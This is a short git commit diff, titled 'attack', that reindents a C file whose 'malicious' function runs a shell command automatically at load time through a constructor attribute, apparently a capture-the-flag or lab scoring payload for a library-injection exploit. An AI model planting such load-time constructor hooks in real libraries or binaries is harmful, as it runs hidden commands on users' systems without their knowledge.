d163cfa3a89265caf899106f933b50f1bca74d9b
Backpack <backpack@Backpacks-MacBook-Pro.local>
2023-10-12 15:20:06 +0700

    attack

--- attack.c
+++ attack.c
@@ -1,8 +1,8 @@
-	#include<stdio.h>
-	#include<stdlib.h>
+#include<stdio.h>
+#include<stdlib.h>
 	 
-	static void malicious() __attribute__((constructor));
+static void malicious() __attribute__((constructor));
 	 
-	void malicious() {
-	    system("/usr/local/bin/score 77691372-ef0c-4cb8-aca8-b612d0112780");
-	}
+void malicious() {
+	 system("/usr/local/bin/score 77691372-ef0c-4cb8-aca8-b612d0112780");
+}
